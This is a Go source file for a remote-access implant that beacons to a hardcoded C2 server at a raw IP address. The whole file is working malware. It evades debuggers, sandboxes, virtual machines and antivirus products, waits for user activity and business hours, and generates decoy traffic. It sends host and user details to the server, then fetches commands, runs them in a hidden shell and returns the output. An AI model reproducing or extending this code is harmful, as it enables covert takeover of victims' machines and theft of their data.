package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	mythicURL = "https://37.27.249.191:7443"
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	mutexName = "Global\\WinServiceHost32"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	
	procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
	procGetCursorPos      = user32.NewProc("GetCursorPos")
	procCreateMutexW      = kernel32.NewProc("CreateMutexW")
	procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
)

type HTTPPayload struct {
	UUID     string `json:"uuid"`
	Size     int    `json:"size"`
	File     string `json:"file"`
}

type HTTPResponse struct {
	UUID     string `json:"uuid"`
	Response string `json:"response"`
}

type MousePoint struct {
	X, Y int32
}

func DetectHostileEnvironment() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	
	ret, _, _ := procIsDebuggerPresent.Call()
	if ret != 0 {
		return true
	}
	
	hostileProcesses := []string{
		"ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
		"regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
		"sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
		"avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
	}
	
	for _, proc := range hostileProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if output, err := cmd.Output(); err == nil {
			if strings.Contains(strings.ToLower(string(output)), proc) {
				return true
			}
		}
	}
	
	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if output, err := cmd.Output(); err == nil {
		manufacturer := strings.ToLower(string(output))
		vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
		for _, vm := range vmStrings {
			if strings.Contains(manufacturer, vm) {
				return true
			}
		}
	}
	
	width, _, _ := procGetSystemMetrics.Call(0)
	height, _, _ := procGetSystemMetrics.Call(1)
	if width < 1024 || height < 768 {
		return true
	}
	
	if runtime.NumCPU() < 2 {
		return true
	}
	
	return false
}

func VerifyUserActivity() bool {
	var pos1, pos2 MousePoint
	
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
	time.Sleep(200 * time.Millisecond)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
	
	return pos1.X != pos2.X || pos1.Y != pos2.Y
}

func IsBusinessHours() bool {
	now := time.Now()
	hour := now.Hour()
	weekday := now.Weekday()
	
	if weekday == time.Saturday || weekday == time.Sunday {
		return false
	}
	
	return hour >= 9 && hour <= 17
}

func HTTPCheckin() error {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	// Tentar endpoint padrão do HTTP C2
	endpoints := []string{
		"/",
		"/index",
		"/api",
		"/login", 
		"/data",
		"/upload",
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	for _, endpoint := range endpoints {
		payload := HTTPPayload{
			UUID: uuid,
			Size: len(hostname),
			File: base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("OS:%s ARCH:%s USER:%s HOST:%s", runtime.GOOS, runtime.GOARCH, os.Getenv("USERNAME"), hostname))),
		}
		
		jsonData, err := json.Marshal(payload)
		if err != nil {
			continue
		}
		
		req, err := http.NewRequest("POST", mythicURL+endpoint, bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		if resp.StatusCode == 200 {
			resp.Body.Close()
			return nil
		}
		resp.Body.Close()
	}
	
	return fmt.Errorf("no valid endpoint found")
}

func HTTPGetTasks() (string, error) {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	endpoints := []string{
		"/",
		"/index", 
		"/api",
		"/data",
		"/download",
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	for _, endpoint := range endpoints {
		req, err := http.NewRequest("GET", mythicURL+endpoint+"?uuid="+uuid, nil)
		if err != nil {
			continue
		}
		
		req.Header.Set("User-Agent", userAgent)
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err == nil && len(body) > 0 {
				// Tentar decodificar como base64
				if decoded, err := base64.StdEncoding.DecodeString(string(body)); err == nil {
					return string(decoded), nil
				}
				return string(body), nil
			}
		} else {
			resp.Body.Close()
		}
	}
	
	return "", nil
}

func ExecuteCommand(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Error: %s", err.Error())
	}
	
	return string(output)
}

func HTTPSendResponse(output string) error {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
	
	response := HTTPResponse{
		UUID:     uuid,
		Response: base64.StdEncoding.EncodeToString([]byte(output)),
	}
	
	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}
	
	endpoints := []string{
		"/",
		"/index",
		"/api", 
		"/upload",
		"/data",
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	for _, endpoint := range endpoints {
		req, err := http.NewRequest("POST", mythicURL+endpoint, bytes.NewBuffer(jsonData))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		if resp.StatusCode == 200 {
			resp.Body.Close()
			return nil
		}
		resp.Body.Close()
	}
	
	return fmt.Errorf("failed to send response")
}

func MaintainLegitimacy() {
	go func() {
		rand.Seed(time.Now().UnixNano())
		
		for {
			sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
			time.Sleep(sleepTime)
			
			activities := []func(){
				func() {
					cmd := exec.Command("nslookup", "microsoft.com")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
				},
				func() {
					cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
				},
			}
			
			if len(activities) > 0 {
				activities[rand.Intn(len(activities))]()
			}
		}
	}()
}

func main() {
	if DetectHostileEnvironment() {
		os.Exit(0)
	}
	
	if !VerifyUserActivity() {
		time.Sleep(10 * time.Second)
		if !VerifyUserActivity() {
			os.Exit(0)
		}
	}
	
	if !IsBusinessHours() {
		now := time.Now()
		nextBusiness := now
		
		for nextBusiness.Weekday() == time.Saturday || 
			nextBusiness.Weekday() == time.Sunday || 
			nextBusiness.Hour() < 9 || 
			nextBusiness.Hour() >= 17 {
			nextBusiness = nextBusiness.Add(1 * time.Hour)
		}
		
		time.Sleep(nextBusiness.Sub(now))
	}
	
	mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
	mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
	if mutex == 0 {
		os.Exit(0)
	}
	
	MaintainLegitimacy()
	
	time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
	
	err := HTTPCheckin()
	if err != nil {
		time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
		os.Exit(0)
	}
	
	rand.Seed(time.Now().UnixNano())
	
	for {
		command, err := HTTPGetTasks()
		if err == nil && command != "" && !strings.Contains(command, "html") {
			output := ExecuteCommand(command)
			HTTPSendResponse(output)
		}
		
		now := time.Now()
		var jitter time.Duration
		
		if now.Hour() >= 9 && now.Hour() <= 17 {
			jitter = time.Duration(3+rand.Intn(7)) * time.Second
		} else {
			jitter = time.Duration(10+rand.Intn(20)) * time.Second
		}
		
		time.Sleep(jitter)
	}
}